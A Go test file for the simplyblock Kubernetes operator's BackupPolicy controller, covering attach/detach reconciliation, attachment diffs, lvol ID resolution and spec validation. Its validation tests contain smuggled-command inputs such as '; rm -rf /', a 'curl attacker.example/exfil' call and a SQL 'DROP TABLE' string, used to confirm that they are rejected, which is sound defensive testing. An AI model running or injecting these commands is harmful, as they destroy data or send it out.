package controller

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/tools/events"
	ctrl "sigs.k8s.io/controller-runtime"
	"sigs.k8s.io/controller-runtime/pkg/client"

	simplyblockv1alpha1 "github.com/simplyblock/simplyblock-operator/api/v1alpha1"
	webapimock "github.com/simplyblock/simplyblock-operator/internal/webapi/mock"
)

func lvol(ns, name, lvolID string) simplyblockv1alpha1.AttachedLvol {
	return simplyblockv1alpha1.AttachedLvol{PVCNamespace: ns, PVCName: name, LvolID: lvolID}
}

const (
	testBackupPolicyNamespace   = "default"
	testBackupPolicyClusterName = "cluster-a"
	testPVC2Name                = "pvc2"
)

func TestBackupPolicyReconcileAnnotationAddAttachesLvol(t *testing.T) {
	const (
		namespace   = "default"
		clusterName = "cluster-a"
		clusterUUID = "cluster-uuid-policy-add"
		policyName  = "policy-add"
		policyID    = "policy-id-add"
		pvcName     = "pvc-add"
		pvName      = "pv-add"
		lvolID      = "lvol-add"
	)

	mock := webapimock.NewSpecServerFromFile(t, "../../../shared/openapi.json", false)
	defer mock.Close()
	mock.Register(http.MethodGet, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/",
		webapimock.RouteResponse{Status: http.StatusOK, Body: backupPolicyListJSON(
			backupPolicyAPIResponse{ID: policyID, Name: policyName},
		)},
	)
	mock.Register(http.MethodPost, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/attach",
		webapimock.RouteResponse{Status: http.StatusOK, Body: `{}`},
	)
	t.Setenv("SIMPLYBLOCK_WEBAPI_BASE_URL", mock.URL())

	policy := testBackupPolicyCR(policyName)
	pv, pvc := testBackupPolicyPVC(pvcName, pvName, policyName, clusterUUID, lvolID, nil)

	r := newBackupPolicyTestReconciler(t,
		policy,
		testCluster(namespace, clusterName, clusterUUID),
		pv,
		pvc,
	)

	res, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)})
	if err != nil {
		t.Fatalf("reconcile returned error: %v", err)
	}
	if res.RequeueAfter != 0 {
		t.Fatalf("expected no requeue, got %+v", res)
	}

	current := getBackupPolicy(t, r.Client, policy)
	if current.Status.PolicyID != policyID {
		t.Fatalf("expected policyID %q, got %q", policyID, current.Status.PolicyID)
	}
	if current.Status.ClusterUUID != clusterUUID {
		t.Fatalf("expected clusterUUID %q, got %q", clusterUUID, current.Status.ClusterUUID)
	}
	if current.Status.Phase != simplyblockv1alpha1.BackupPolicyPhaseActive {
		t.Fatalf("expected phase %q, got %q", simplyblockv1alpha1.BackupPolicyPhaseActive, current.Status.Phase)
	}
	if len(current.Status.AttachedLvols) != 1 || current.Status.AttachedLvols[0] != lvol(namespace, pvcName, lvolID) {
		t.Fatalf("unexpected attached lvols: %#v", current.Status.AttachedLvols)
	}

	reqs := mock.Requests()
	if len(reqs) != 2 {
		t.Fatalf("expected 2 backend requests, got %#v", reqs)
	}
	assertAttachDetachRequest(t, reqs[1],
		"/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/attach", lvolID)
}

func TestBackupPolicyReconcileAnnotationRemovalDetachesLvol(t *testing.T) {
	const (
		namespace   = "default"
		clusterName = "cluster-a"
		clusterUUID = "cluster-uuid-policy-remove"
		policyName  = "policy-remove"
		policyID    = "policy-id-remove"
		pvcName     = "pvc-remove"
		pvName      = "pv-remove"
		lvolID      = "lvol-remove"
	)

	mock := webapimock.NewSpecServerFromFile(t, "../../../shared/openapi.json", false)
	defer mock.Close()
	mock.Register(http.MethodGet, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/",
		webapimock.RouteResponse{Status: http.StatusOK, Body: backupPolicyListJSON(
			backupPolicyAPIResponse{ID: policyID, Name: policyName},
		)},
	)
	mock.Register(http.MethodPost, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/detach",
		webapimock.RouteResponse{Status: http.StatusOK, Body: `{}`},
	)
	t.Setenv("SIMPLYBLOCK_WEBAPI_BASE_URL", mock.URL())

	policy := testBackupPolicyCR(policyName)
	policy.Status.PolicyID = policyID
	policy.Status.AttachedLvols = []simplyblockv1alpha1.AttachedLvol{lvol(namespace, pvcName, lvolID)}
	pv, pvc := testBackupPolicyPVC(pvcName, pvName, "", clusterUUID, lvolID, nil)

	r := newBackupPolicyTestReconciler(t,
		policy,
		testCluster(namespace, clusterName, clusterUUID),
		pv,
		pvc,
	)

	res, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)})
	if err != nil {
		t.Fatalf("reconcile returned error: %v", err)
	}
	if res.RequeueAfter != 0 {
		t.Fatalf("expected no requeue, got %+v", res)
	}

	current := getBackupPolicy(t, r.Client, policy)
	if len(current.Status.AttachedLvols) != 0 {
		t.Fatalf("expected all attachments removed, got %#v", current.Status.AttachedLvols)
	}

	reqs := mock.Requests()
	if len(reqs) != 2 {
		t.Fatalf("expected 2 backend requests, got %#v", reqs)
	}
	assertAttachDetachRequest(t, reqs[1],
		"/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/detach", lvolID)
}

func TestBackupPolicyReconcilePolicySwitchMovesAttachment(t *testing.T) {
	const (
		namespace   = "default"
		clusterName = "cluster-a"
		clusterUUID = "cluster-uuid-policy-switch"
		oldPolicy   = "policy-old"
		newPolicy   = "policy-new"
		oldPolicyID = "policy-id-old"
		newPolicyID = "policy-id-new"
		pvcName     = "pvc-switch"
		pvName      = "pv-switch"
		lvolID      = "lvol-switch"
	)

	mock := webapimock.NewSpecServerFromFile(t, "../../../shared/openapi.json", false)
	defer mock.Close()
	mock.Register(http.MethodGet, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/",
		webapimock.RouteResponse{Status: http.StatusOK, Body: backupPolicyListJSON(
			backupPolicyAPIResponse{ID: oldPolicyID, Name: oldPolicy},
			backupPolicyAPIResponse{ID: newPolicyID, Name: newPolicy},
		)},
	)
	mock.Register(http.MethodPost, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+oldPolicyID+"/detach",
		webapimock.RouteResponse{Status: http.StatusOK, Body: `{}`},
	)
	mock.Register(http.MethodPost, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+newPolicyID+"/attach",
		webapimock.RouteResponse{Status: http.StatusOK, Body: `{}`},
	)
	t.Setenv("SIMPLYBLOCK_WEBAPI_BASE_URL", mock.URL())

	oldCR := testBackupPolicyCR(oldPolicy)
	oldCR.Status.PolicyID = oldPolicyID
	oldCR.Status.AttachedLvols = []simplyblockv1alpha1.AttachedLvol{lvol(namespace, pvcName, lvolID)}
	newCR := testBackupPolicyCR(newPolicy)
	newCR.Status.PolicyID = newPolicyID
	pv, pvc := testBackupPolicyPVC(pvcName, pvName, newPolicy, clusterUUID, lvolID, nil)

	r := newBackupPolicyTestReconciler(t,
		oldCR,
		newCR,
		testCluster(namespace, clusterName, clusterUUID),
		pv,
		pvc,
	)

	if _, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(oldCR)}); err != nil {
		t.Fatalf("old policy reconcile returned error: %v", err)
	}
	if _, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(newCR)}); err != nil {
		t.Fatalf("new policy reconcile returned error: %v", err)
	}

	currentOld := getBackupPolicy(t, r.Client, oldCR)
	if len(currentOld.Status.AttachedLvols) != 0 {
		t.Fatalf("expected old policy attachments to be removed, got %#v", currentOld.Status.AttachedLvols)
	}
	currentNew := getBackupPolicy(t, r.Client, newCR)
	if len(currentNew.Status.AttachedLvols) != 1 || currentNew.Status.AttachedLvols[0] != lvol(namespace, pvcName, lvolID) {
		t.Fatalf("unexpected new policy attachments: %#v", currentNew.Status.AttachedLvols)
	}

	reqs := mock.Requests()
	if len(reqs) != 4 {
		t.Fatalf("expected 4 backend requests, got %#v", reqs)
	}
	assertAttachDetachRequest(t, reqs[1],
		"/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+oldPolicyID+"/detach", lvolID)
	assertAttachDetachRequest(t, reqs[3],
		"/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+newPolicyID+"/attach", lvolID)
}

func TestBackupPolicyReconcileLvolAnnotationMismatchDetachesStaleAttachment(t *testing.T) {
	const (
		namespace   = "default"
		clusterName = "cluster-a"
		clusterUUID = "cluster-uuid-policy-mismatch"
		policyName  = "policy-mismatch"
		policyID    = "policy-id-mismatch"
		pvcName     = "pvc-mismatch"
		pvName      = "pv-mismatch"
		handleLvol  = "lvol-from-handle"
		staleLvol   = "lvol-stale-annotation"
	)

	mock := webapimock.NewSpecServerFromFile(t, "../../../shared/openapi.json", false)
	defer mock.Close()
	mock.Register(http.MethodGet, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/",
		webapimock.RouteResponse{Status: http.StatusOK, Body: backupPolicyListJSON(
			backupPolicyAPIResponse{ID: policyID, Name: policyName},
		)},
	)
	mock.Register(http.MethodPost, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/detach",
		webapimock.RouteResponse{Status: http.StatusOK, Body: `{}`},
	)
	t.Setenv("SIMPLYBLOCK_WEBAPI_BASE_URL", mock.URL())

	policy := testBackupPolicyCR(policyName)
	policy.Status.PolicyID = policyID
	policy.Status.AttachedLvols = []simplyblockv1alpha1.AttachedLvol{lvol(namespace, pvcName, staleLvol)}
	pv, pvc := testBackupPolicyPVC(pvcName, pvName, policyName, clusterUUID, handleLvol,
		map[string]string{pvcLvolIDAnnotation: staleLvol})

	r := newBackupPolicyTestReconciler(t,
		policy,
		testCluster(namespace, clusterName, clusterUUID),
		pv,
		pvc,
	)

	if _, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)}); err != nil {
		t.Fatalf("reconcile returned error: %v", err)
	}

	current := getBackupPolicy(t, r.Client, policy)
	if len(current.Status.AttachedLvols) != 0 {
		t.Fatalf("expected stale attachment to be removed, got %#v", current.Status.AttachedLvols)
	}

	reqs := mock.Requests()
	if len(reqs) != 2 {
		t.Fatalf("expected 2 backend requests, got %#v", reqs)
	}
	assertAttachDetachRequest(t, reqs[1],
		"/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/detach", staleLvol)
}

func TestBackupPolicyReconcilePVCRebindSwapsLvolID(t *testing.T) {
	const (
		namespace   = "default"
		clusterName = "cluster-a"
		clusterUUID = "cluster-uuid-policy-rebind"
		policyName  = "policy-rebind"
		policyID    = "policy-id-rebind"
		pvcName     = "pvc-rebind"
		pvName      = "pv-rebind"
		oldLvolID   = "lvol-old"
		newLvolID   = "lvol-new"
	)

	mock := webapimock.NewSpecServerFromFile(t, "../../../shared/openapi.json", false)
	defer mock.Close()
	mock.Register(http.MethodGet, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/",
		webapimock.RouteResponse{Status: http.StatusOK, Body: backupPolicyListJSON(
			backupPolicyAPIResponse{ID: policyID, Name: policyName},
		)},
	)
	mock.Register(http.MethodPost, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/attach",
		webapimock.RouteResponse{Status: http.StatusOK, Body: `{}`},
	)
	mock.Register(http.MethodPost, "/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/detach",
		webapimock.RouteResponse{Status: http.StatusOK, Body: `{}`},
	)
	t.Setenv("SIMPLYBLOCK_WEBAPI_BASE_URL", mock.URL())

	policy := testBackupPolicyCR(policyName)
	policy.Status.PolicyID = policyID
	policy.Status.AttachedLvols = []simplyblockv1alpha1.AttachedLvol{lvol(namespace, pvcName, oldLvolID)}
	pv, pvc := testBackupPolicyPVC(pvcName, pvName, policyName, clusterUUID, newLvolID, nil)

	r := newBackupPolicyTestReconciler(t,
		policy,
		testCluster(namespace, clusterName, clusterUUID),
		pv,
		pvc,
	)

	if _, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)}); err != nil {
		t.Fatalf("reconcile returned error: %v", err)
	}

	current := getBackupPolicy(t, r.Client, policy)
	if len(current.Status.AttachedLvols) != 1 || current.Status.AttachedLvols[0] != lvol(namespace, pvcName, newLvolID) {
		t.Fatalf("expected attachment to move to %q, got %#v", newLvolID, current.Status.AttachedLvols)
	}

	reqs := mock.Requests()
	if len(reqs) != 3 {
		t.Fatalf("expected 3 backend requests, got %#v", reqs)
	}
	assertAttachDetachRequest(t, reqs[1],
		"/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/attach", newLvolID)
	assertAttachDetachRequest(t, reqs[2],
		"/api/v2/clusters/"+clusterUUID+"/backups/backup-policies/"+policyID+"/detach", oldLvolID)
}

func TestDiffAttachments_NoChange(t *testing.T) {
	a := []simplyblockv1alpha1.AttachedLvol{lvol("ns", "pvc1", "lvol-aaa")}
	b := []simplyblockv1alpha1.AttachedLvol{lvol("ns", "pvc1", "lvol-aaa")}
	if got := diffAttachments(a, b); len(got) != 0 {
		t.Fatalf("expected no diff, got %v", got)
	}
}

func TestDiffAttachments_NewAttachment(t *testing.T) {
	desired := []simplyblockv1alpha1.AttachedLvol{
		lvol("ns", "pvc1", "lvol-aaa"),
		lvol("ns", testPVC2Name, "lvol-bbb"),
	}
	current := []simplyblockv1alpha1.AttachedLvol{lvol("ns", "pvc1", "lvol-aaa")}
	got := diffAttachments(desired, current)
	if len(got) != 1 || got[0].PVCName != testPVC2Name {
		t.Fatalf("expected %s to attach, got %v", testPVC2Name, got)
	}
}

func TestDiffAttachments_RemovedAttachment(t *testing.T) {
	desired := []simplyblockv1alpha1.AttachedLvol{lvol("ns", "pvc1", "lvol-aaa")}
	current := []simplyblockv1alpha1.AttachedLvol{
		lvol("ns", "pvc1", "lvol-aaa"),
		lvol("ns", testPVC2Name, "lvol-bbb"),
	}
	got := diffAttachments(current, desired)
	if len(got) != 1 || got[0].PVCName != testPVC2Name {
		t.Fatalf("expected %s to detach, got %v", testPVC2Name, got)
	}
}

// TestDiffAttachments_ReboundPVC is the regression test for the bug where
// a PVC rebound to a new lvol was invisible to the diff (same ns/name, different
// lvolID). The old lvol must appear in toDetach and the new one in toAttach.
func TestDiffAttachments_ReboundPVC(t *testing.T) {
	desired := []simplyblockv1alpha1.AttachedLvol{lvol("ns", "pvc1", "lvol-new")}
	current := []simplyblockv1alpha1.AttachedLvol{lvol("ns", "pvc1", "lvol-old")}

	toAttach := diffAttachments(desired, current)
	toDetach := diffAttachments(current, desired)

	if len(toAttach) != 1 || toAttach[0].LvolID != "lvol-new" {
		t.Fatalf("expected lvol-new in toAttach, got %v", toAttach)
	}
	if len(toDetach) != 1 || toDetach[0].LvolID != "lvol-old" {
		t.Fatalf("expected lvol-old in toDetach, got %v", toDetach)
	}
}

func TestRemoveAttachment(t *testing.T) {
	slice := []simplyblockv1alpha1.AttachedLvol{
		lvol("ns", "pvc1", "lvol-aaa"),
		lvol("ns", testPVC2Name, "lvol-bbb"),
	}
	result := removeAttachment(slice, lvol("ns", "pvc1", "lvol-aaa"))
	if len(result) != 1 || result[0].PVCName != testPVC2Name {
		t.Fatalf("expected only %s remaining, got %v", testPVC2Name, result)
	}
}

// Removing by PVC key alone must not drop an entry that shares the name but has
// a different lvolID (e.g. after a rebind, the new attachment must survive).
func TestRemoveAttachment_DoesNotMatchDifferentLvol(t *testing.T) {
	slice := []simplyblockv1alpha1.AttachedLvol{
		lvol("ns", "pvc1", "lvol-new"),
	}
	result := removeAttachment(slice, lvol("ns", "pvc1", "lvol-old"))
	if len(result) != 1 {
		t.Fatalf("expected new attachment to survive removal of old lvolID, got %v", result)
	}
}

// ---- resolvePVCLvolID tests ----

const (
	resolveTestClusterUUID = "cluster-uuid-1"
	resolveTestLvolID      = "lvol-resolve-1"
	resolveTestPVName      = "pv-resolve-1"
	resolveTestPVCName     = "pvc-resolve-1"
	resolveTestNamespace   = "default"
)

func resolveTestObjects(clusterUUID string, annotations map[string]string) (*corev1.PersistentVolume, *corev1.PersistentVolumeClaim) {
	pv := &corev1.PersistentVolume{
		ObjectMeta: metav1.ObjectMeta{Name: resolveTestPVName},
		Spec: corev1.PersistentVolumeSpec{
			PersistentVolumeSource: corev1.PersistentVolumeSource{
				CSI: &corev1.CSIPersistentVolumeSource{
					VolumeHandle: clusterUUID + ":pool-a:" + resolveTestLvolID,
				},
			},
		},
	}
	pvc := &corev1.PersistentVolumeClaim{
		ObjectMeta: metav1.ObjectMeta{
			Name:        resolveTestPVCName,
			Namespace:   resolveTestNamespace,
			Annotations: annotations,
		},
		Spec: corev1.PersistentVolumeClaimSpec{VolumeName: resolveTestPVName},
	}
	return pv, pvc
}

func TestResolvePVCLvolID_FromHandle(t *testing.T) {
	pv, pvc := resolveTestObjects(resolveTestClusterUUID, nil)
	scheme := newTestScheme(t, corev1.AddToScheme)
	k8s := newTestClient(t, scheme, nil, pv, pvc)

	got, err := resolvePVCLvolID(context.Background(), k8s, pvc, resolveTestClusterUUID)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != resolveTestLvolID {
		t.Fatalf("expected %s, got %s", resolveTestLvolID, got)
	}
}

func TestResolvePVCLvolID_AnnotationMatchesHandle(t *testing.T) {
	ann := map[string]string{pvcLvolIDAnnotation: resolveTestLvolID}
	pv, pvc := resolveTestObjects(resolveTestClusterUUID, ann)
	scheme := newTestScheme(t, corev1.AddToScheme)
	k8s := newTestClient(t, scheme, nil, pv, pvc)

	got, err := resolvePVCLvolID(context.Background(), k8s, pvc, resolveTestClusterUUID)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != resolveTestLvolID {
		t.Fatalf("expected %s, got %s", resolveTestLvolID, got)
	}
}

// TestResolvePVCLvolID_AnnotationMismatch is the core regression test: when the
// simplybk/lvol-id annotation disagrees with the PV CSI volume handle the call
// must return an error, not silently use the (potentially stale) annotation.
func TestResolvePVCLvolID_AnnotationMismatch(t *testing.T) {
	ann := map[string]string{pvcLvolIDAnnotation: "lvol-stale-annotation"}
	pv, pvc := resolveTestObjects(resolveTestClusterUUID, ann)
	scheme := newTestScheme(t, corev1.AddToScheme)
	k8s := newTestClient(t, scheme, nil, pv, pvc)

	_, err := resolvePVCLvolID(context.Background(), k8s, pvc, resolveTestClusterUUID)
	if err == nil {
		t.Fatal("expected mismatch error, got nil")
	}
	if !strings.Contains(err.Error(), "does not match") {
		t.Fatalf("error message should mention mismatch, got: %v", err)
	}
}

func TestResolvePVCLvolID_WrongCluster(t *testing.T) {
	pv, pvc := resolveTestObjects("other-cluster-uuid", nil)
	scheme := newTestScheme(t, corev1.AddToScheme)
	k8s := newTestClient(t, scheme, nil, pv, pvc)

	_, err := resolvePVCLvolID(context.Background(), k8s, pvc, resolveTestClusterUUID)
	if err == nil {
		t.Fatal("expected cluster mismatch error, got nil")
	}
}

func TestResolvePVCLvolID_Unbound(t *testing.T) {
	pvc := &corev1.PersistentVolumeClaim{
		ObjectMeta: metav1.ObjectMeta{Name: resolveTestPVCName, Namespace: resolveTestNamespace},
		Spec:       corev1.PersistentVolumeClaimSpec{},
	}
	scheme := newTestScheme(t, corev1.AddToScheme)
	k8s := newTestClient(t, scheme, nil, pvc)

	_, err := resolvePVCLvolID(context.Background(), k8s, pvc, resolveTestClusterUUID)
	if err == nil || !strings.Contains(err.Error(), "not bound") {
		t.Fatalf("expected 'not bound' error, got: %v", err)
	}
}

func testBackupPolicyCR(name string) *simplyblockv1alpha1.BackupPolicy {
	return &simplyblockv1alpha1.BackupPolicy{
		ObjectMeta: metav1.ObjectMeta{
			Name:       name,
			Namespace:  testBackupPolicyNamespace,
			Finalizers: []string{backupPolicyFinalizer},
		},
		Spec: simplyblockv1alpha1.BackupPolicySpec{
			ClusterName: testBackupPolicyClusterName,
		},
	}
}

func testBackupPolicyPVC(pvcName, pvName, policyName, clusterUUID, lvolID string, extraAnnotations map[string]string) (*corev1.PersistentVolume, *corev1.PersistentVolumeClaim) {
	annotations := map[string]string{}
	if policyName != "" {
		annotations[pvcBackupPolicyAnnotation] = policyName
	}
	for k, v := range extraAnnotations {
		annotations[k] = v
	}

	pv := &corev1.PersistentVolume{
		ObjectMeta: metav1.ObjectMeta{Name: pvName},
		Spec: corev1.PersistentVolumeSpec{
			PersistentVolumeSource: corev1.PersistentVolumeSource{
				CSI: &corev1.CSIPersistentVolumeSource{
					VolumeHandle: clusterUUID + ":pool-a:" + lvolID,
				},
			},
		},
	}
	pvc := &corev1.PersistentVolumeClaim{
		ObjectMeta: metav1.ObjectMeta{
			Name:        pvcName,
			Namespace:   testBackupPolicyNamespace,
			Annotations: annotations,
		},
		Spec: corev1.PersistentVolumeClaimSpec{
			VolumeName: pvName,
		},
	}

	return pv, pvc
}

func backupPolicyListJSON(policies ...backupPolicyAPIResponse) string {
	body, err := json.Marshal(policies)
	if err != nil {
		panic(err)
	}
	return string(body)
}

func getBackupPolicy(t *testing.T, cl client.Client, policy *simplyblockv1alpha1.BackupPolicy) *simplyblockv1alpha1.BackupPolicy {
	t.Helper()

	current := &simplyblockv1alpha1.BackupPolicy{}
	if err := cl.Get(context.Background(), client.ObjectKeyFromObject(policy), current); err != nil {
		t.Fatalf("failed to get BackupPolicy %s/%s: %v", policy.Namespace, policy.Name, err)
	}
	return current
}

func assertAttachDetachRequest(t *testing.T, req webapimock.RecordedRequest, path, lvolID string) {
	t.Helper()

	if req.Method != http.MethodPost || req.Path != path {
		t.Fatalf("unexpected request: got %s %s want %s %s", req.Method, req.Path, http.MethodPost, path)
	}

	var body backupPolicyAttachRequest
	if err := json.Unmarshal(req.Body, &body); err != nil {
		t.Fatalf("failed to decode request body %q: %v", string(req.Body), err)
	}
	if body.TargetType != "lvol" || body.TargetID != lvolID {
		t.Fatalf("unexpected attach/detach body: %#v", body)
	}
}

// ---- validateBackupPolicySpec tests ----

func TestValidateBackupPolicySpec(t *testing.T) {
	tests := []struct {
		name    string
		spec    simplyblockv1alpha1.BackupPolicySpec
		wantErr bool
	}{
		// valid — empty optional fields
		{name: "empty fields", spec: simplyblockv1alpha1.BackupPolicySpec{}},
		// valid schedules
		{name: "schedule single pair minutes", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4"}},
		{name: "schedule single pair hours", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "2h,3"}},
		{name: "schedule single pair days", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "1d,7"}},
		{name: "schedule single pair weeks", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "1w,2"}},
		{name: "schedule multi pair", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4 60m,11 24h,7"}},
		// valid maxAge
		{name: "maxAge minutes", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "30m"}},
		{name: "maxAge hours", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "12h"}},
		{name: "maxAge days", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "7d"}},
		{name: "maxAge weeks", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "2w"}},
		// invalid schedules
		{name: "schedule @reboot macro", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "@reboot"}, wantErr: true},
		{name: "schedule shell injection semicolon", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4; rm -rf /"}, wantErr: true},
		{name: "schedule missing keep count", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m"}, wantErr: true},
		{name: "schedule invalid unit", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15s,4"}, wantErr: true},
		{name: "schedule named macro", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "@daily"}, wantErr: true},
		// invalid maxAge
		{name: "maxAge bad unit suffix", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "7x"}, wantErr: true},
		{name: "maxAge shell injection", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "7d; rm -rf /"}, wantErr: true},
		{name: "maxAge no leading digit", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "d"}, wantErr: true},
		{name: "maxAge empty string unit only", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "h"}, wantErr: true},
		// zero is not a positive duration/interval
		{name: "maxAge zero", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "0d"}, wantErr: true},
		{name: "maxAge zero-prefixed", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "07d"}, wantErr: true},
		// tab/newline must not be accepted as a pair separator or trailing character
		{name: "schedule tab separator", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4\t60m,11"}, wantErr: true},
		{name: "schedule newline separator", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4\n60m,11"}, wantErr: true},
		{name: "schedule trailing newline", spec: simplyblockv1alpha1.BackupPolicySpec{Schedule: "15m,4\n"}, wantErr: true},
		{name: "maxAge trailing newline", spec: simplyblockv1alpha1.BackupPolicySpec{MaxAge: "7d\n"}, wantErr: true},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			msg := validateBackupPolicySpec(tc.spec)
			if tc.wantErr && msg == "" {
				t.Fatal("expected a validation error message, got none")
			}
			if !tc.wantErr && msg != "" {
				t.Fatalf("expected no error, got %q", msg)
			}
		})
	}
}

func TestBackupPolicyReconcileInvalidScheduleSetsFailed(t *testing.T) {
	const policyName = "policy-bad-schedule"

	policy := testBackupPolicyCR(policyName)
	// Inject a malicious schedule string — must not reach the backend.
	policy.Spec.Schedule = "@reboot; curl attacker.example/exfil"

	r := newBackupPolicyTestReconciler(t, policy)

	res, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)})
	if err != nil {
		t.Fatalf("reconcile returned unexpected error: %v", err)
	}
	if res.RequeueAfter != 0 {
		t.Fatalf("expected terminal (no-requeue) result, got %+v", res)
	}

	current := getBackupPolicy(t, r.Client, policy)
	if current.Status.Phase != simplyblockv1alpha1.BackupPolicyPhaseFailed {
		t.Fatalf("expected phase %q, got %q", simplyblockv1alpha1.BackupPolicyPhaseFailed, current.Status.Phase)
	}
	if !strings.Contains(current.Status.Message, "invalid schedule") {
		t.Fatalf("expected message to mention \"invalid schedule\", got %q", current.Status.Message)
	}
}

func TestBackupPolicyReconcileInvalidMaxAgeSetsFailed(t *testing.T) {
	const policyName = "policy-bad-maxage"

	policy := testBackupPolicyCR(policyName)
	// Inject a malicious maxAge string — must not reach the backend.
	policy.Spec.MaxAge = "7d; DROP TABLE backups;--"

	r := newBackupPolicyTestReconciler(t, policy)

	res, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)})
	if err != nil {
		t.Fatalf("reconcile returned unexpected error: %v", err)
	}
	if res.RequeueAfter != 0 {
		t.Fatalf("expected terminal (no-requeue) result, got %+v", res)
	}

	current := getBackupPolicy(t, r.Client, policy)
	if current.Status.Phase != simplyblockv1alpha1.BackupPolicyPhaseFailed {
		t.Fatalf("expected phase %q, got %q", simplyblockv1alpha1.BackupPolicyPhaseFailed, current.Status.Phase)
	}
	if !strings.Contains(current.Status.Message, "invalid maxAge") {
		t.Fatalf("expected message to mention \"invalid maxAge\", got %q", current.Status.Message)
	}
}

func TestBackupPolicyReconcileInvalidSpecMakesNoBackendCalls(t *testing.T) {
	const policyName = "policy-bad-no-api"

	policy := testBackupPolicyCR(policyName)
	policy.Spec.Schedule = "*/5 * * * *" // cron-style — not our format

	// Deliberately provide no mock server — any backend call would panic or
	// fail with a connection error, proving the validation short-circuits first.
	r := newBackupPolicyTestReconciler(t, policy)

	_, err := r.Reconcile(context.Background(), ctrl.Request{NamespacedName: client.ObjectKeyFromObject(policy)})
	if err != nil {
		t.Fatalf("reconcile returned unexpected error: %v", err)
	}

	current := getBackupPolicy(t, r.Client, policy)
	if current.Status.Phase != simplyblockv1alpha1.BackupPolicyPhaseFailed {
		t.Fatalf("expected Failed phase, got %q", current.Status.Phase)
	}
}

func newBackupPolicyTestReconciler(t *testing.T, objects ...client.Object) *BackupPolicyReconciler {
	t.Helper()

	scheme := newTestScheme(t, simplyblockv1alpha1.AddToScheme, corev1.AddToScheme)
	cl := newTestClient(t, scheme, []client.Object{
		&simplyblockv1alpha1.BackupPolicy{},
	}, objects...)

	return &BackupPolicyReconciler{
		Client:   cl,
		Scheme:   scheme,
		Recorder: events.NewFakeRecorder(32),
	}
}
